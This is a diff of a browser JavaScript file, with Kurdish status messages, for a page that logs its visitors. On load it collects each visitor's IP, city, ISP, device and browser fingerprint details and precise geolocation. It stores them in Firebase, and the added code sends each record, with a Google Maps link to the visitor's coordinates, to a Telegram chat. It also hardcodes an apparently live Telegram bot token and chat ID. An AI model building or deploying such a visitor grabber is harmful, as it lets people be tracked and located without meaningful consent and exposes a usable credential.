@@ -1,6 +1,6 @@
 // Import the functions you need from the SDKs you need
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+import { getFirestore, doc, runTransaction, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
 // Your web app's Firebase configuration
 const firebaseConfig = {
@@ -12,6 +12,10 @@ const firebaseConfig = {
     appId: "1:1058281648206:web:456211d8af3a72f3fa131f",
     measurementId: "G-KP91BWPLN0"
 };
+
+// Telegram Config
+const TELEGRAM_BOT_TOKEN = "8177366849:AAE0l7QIXDW0st-BpUjdKk8sZlGjYME5_ws";
+const TELEGRAM_CHAT_ID = "910275034";
 
 // Initialize Firebase
 const app = initializeApp(firebaseConfig);
@@ -33,7 +37,6 @@ document.addEventListener('DOMContentLoaded', async () => {
 
     try {
         // 1. Fetch IP and Location Info
-        // Using ipwho.is which is free and reliable (no API key needed)
         const ipRes = await fetch('https://ipwho.is/');
         const ipData = await ipRes.json();
 
@@ -43,11 +46,10 @@ document.addEventListener('DOMContentLoaded', async () => {
 
         // 2. Detect Device Info
         const userAgent = navigator.userAgent;
-        let os = ipData.os || "Unknown OS";    // ipwho.is provides OS often
-        let browser = ipData.browser || "Unknown Browser"; // ipwho.is provides browser often
+        let os = ipData.os || "Unknown OS";
+        let browser = ipData.browser || "Unknown Browser";
         let deviceType = "Desktop";
 
-        // Fallback or refine OS/Browser/Device if API content is generic
         if (userAgent.indexOf("Mobi") !== -1) deviceType = "Mobile";
 
         // 3. Detect Connection Type
@@ -56,7 +58,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         let connectionSpeed = "Unknown Speed";
 
         if (navigator.connection) {
-            connectionSpeed = navigator.connection.effectiveType.toUpperCase(); // 4G, 3G, etc.
+            connectionSpeed = navigator.connection.effectiveType.toUpperCase();
         }
 
         // 4. Update UI - Basic Info
@@ -85,7 +87,6 @@ document.addEventListener('DOMContentLoaded', async () => {
             webdriver: navigator.webdriver || false
         };
 
-        // Display Detailed Info
         const detailedDisplay = document.getElementById('detailed-device-display');
         let detailsText = "";
         for (const [key, value] of Object.entries(detailedInfo)) {
@@ -101,74 +102,45 @@ document.addEventListener('DOMContentLoaded', async () => {
         setTimeout(() => {
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
-                    // Success
-                    (position) => {
-                        const collectedData = {
-                            ip: ipData.ip,
-                            city: ipData.city,
-                            country: ipData.country,
-                            isp: isp,
-                            org: org,
-                            deviceType: deviceType,
-                            os: os,
-                            browser: browser,
-                            connection: connectionSpeed,
-                            userAgent: userAgent,
-                            detailed: detailedInfo,
-                            location: {
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude,
-                                accuracy: position.coords.accuracy
-                            },
-                            timestamp: serverTimestamp()
-                        };
-                        saveDataToFirebase(collectedData);
-                    },
-                    // Error / Denied
+                    (position) => { processAndSave(position.coords); },
                     (error) => {
-                        console.warn("Location access denied or error:", error.message);
-                        // Save without precise location
-                        const collectedData = {
-                            ip: ipData.ip,
-                            city: ipData.city,
-                            country: ipData.country,
-                            isp: isp,
-                            org: org,
-                            deviceType: deviceType,
-                            os: os,
-                            browser: browser,
-                            connection: connectionSpeed,
-                            userAgent: userAgent,
-                            detailed: detailedInfo,
-                            location: {
-                                error: error.message,
-                                status: "Denied/Unavailable"
-                            },
-                            timestamp: serverTimestamp()
-                        };
-                        saveDataToFirebase(collectedData);
+                        console.warn("Location error:", error.message);
+                        processAndSave(null, error.message);
                     }
                 );
             } else {
-                // Geolocation not supported
-                const collectedData = {
-                    ip: ipData.ip,
-                    city: ipData.city,
-                    country: ipData.country,
-                    isp: isp,
-                    org: org,
-                    deviceType: deviceType,
-                    os: os,
-                    browser: browser,
-                    connection: connectionSpeed,
-                    userAgent: userAgent,
-                    detailed: detailedInfo,
-                    location: { status: "Not Supported" },
-                    timestamp: serverTimestamp()
-                };
-                saveDataToFirebase(collectedData);
+                processAndSave(null, "Not Supported");
             }
-        }, 500); // 0.5 second delay
+        }, 500);
+
+        async function processAndSave(coords, errorMsg = null) {
+            const collectedData = {
+                ip: ipData.ip,
+                city: ipData.city,
+                country: ipData.country,
+                isp: isp,
+                org: org,
+                deviceType: deviceType,
+                os: os,
+                browser: browser,
+                connection: connectionSpeed,
+                userAgent: userAgent,
+                detailed: detailedInfo,
+                location: coords ? {
+                    latitude: coords.latitude,
+                    longitude: coords.longitude,
+                    accuracy: coords.accuracy,
+                    mapsLink: `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`
+                } : { status: errorMsg || "Unknown" },
+                timestamp: serverTimestamp()
+            };
+
+            // Send to Telegram
+            sendToTelegram(collectedData);
+
+            // Save to Firebase
+            await saveDataToFirebase(collectedData);
+        }
 
     } catch (error) {
         console.error("Error collecting data:", error);
@@ -178,21 +150,75 @@ document.addEventListener('DOMContentLoaded', async () => {
         `;
     }
 
+    // --- Firebase: Sequential ID Saving ---
     async function saveDataToFirebase(data) {
         try {
-            // Add a new document with a generated id.
-            const docRef = await addDoc(collection(db, "visitors"), data);
+            const counterRef = doc(db, "metadata", "counter");
 
-            console.log("Document written with ID: ", docRef.id);
-            saveStatus.textContent = "✅ زانیاری بە سەرکەوتوویی لە Firebase سەیڤ کرا";
+            await runTransaction(db, async (transaction) => {
+                const counterDoc = await transaction.get(counterRef);
+                let newCount = 1;
+
+                if (counterDoc.exists()) {
+                    newCount = counterDoc.data().count + 1;
+                }
+
+                // 1. Update Counter
+                transaction.set(counterRef, { count: newCount });
+
+                // 2. Set Visitor Data with ID "1", "2", etc.
+                const newVisitorRef = doc(db, "visitors", newCount.toString());
+                transaction.set(newVisitorRef, data);
+            });
+
+            console.log("Document successfully written with sequential ID!");
+            saveStatus.textContent = "✅ زانیاری بە سەرکەوتوویی لە Firebase و Telegram سەیڤ کرا";
             saveStatus.style.backgroundColor = "rgba(16, 185, 129, 0.2)";
             saveStatus.style.color = "#10b981";
 
         } catch (e) {
             console.error("Error adding document: ", e);
-            saveStatus.textContent = "❌ کێشە هەیە لە سەیڤکردنی زانیاری لە Firebase";
+            saveStatus.textContent = "❌ کێشە هەیە لە " + e.message;
             saveStatus.style.backgroundColor = "rgba(239, 68, 68, 0.2)";
             saveStatus.style.color = "#ef4444";
         }
+    }
+
+    // --- Telegram Function ---
+    function sendToTelegram(data) {
+        const text = `
+🚨 <b>New Visitor Logged!</b> 🚨
+
+🌍 <b>IP:</b> ${data.ip}
+🏳️ <b>Country:</b> ${data.country}, ${data.city}
+📱 <b>Device:</b> ${data.deviceType} (${data.os})
+🕸️ <b>Browser:</b> ${data.browser}
+🔌 <b>ISP:</b> ${data.isp}
+🏢 <b>Org:</b> ${data.org}
+📶 <b>Speed:</b> ${data.connection}
+
+📍 <b>Location:</b> ${data.location.mapsLink ? `<a href="${data.location.mapsLink}">View on Maps</a>` : (data.location.status || "N/A")}
+
+📝 <b>User Agent:</b>
+<pre>${data.userAgent}</pre>
+`;
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: text,
+                parse_mode: 'HTML',
+                disable_web_page_preview: true
+            })
+        })
+            .then(res => res.json())
+            .then(data => {
+                if (!data.ok) console.error("Telegram Error:", data);
+            })
+            .catch(err => console.error("Telegram Fetch Error:", err));
     }
 });
